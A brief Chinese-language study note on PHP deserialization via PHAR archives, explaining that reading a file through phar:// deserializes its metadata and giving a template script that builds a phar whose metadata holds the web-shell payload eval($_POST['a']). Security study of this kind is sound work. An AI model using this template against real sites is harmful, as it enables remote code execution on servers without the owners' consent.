PHP反序列化

PHAR

1.一系列小的压缩文件

2.phar是类似zip一样的压缩包文件(把php文件压缩成压缩包)

3.phar会将文件进行序列化并且存储下来 在用phar://伪协议读取的时候会自动反序列化

<?php
include "phar:///file/to/your/path/file.php";
?>

phar文件生成的模板 

<?php
class Testobj{
    var $output = "";
}
@unlink("test.phar"); //删除之前可能生成的phar文件
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
$o = new Testobj();
$o->output = "eval($_POST['a']);";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
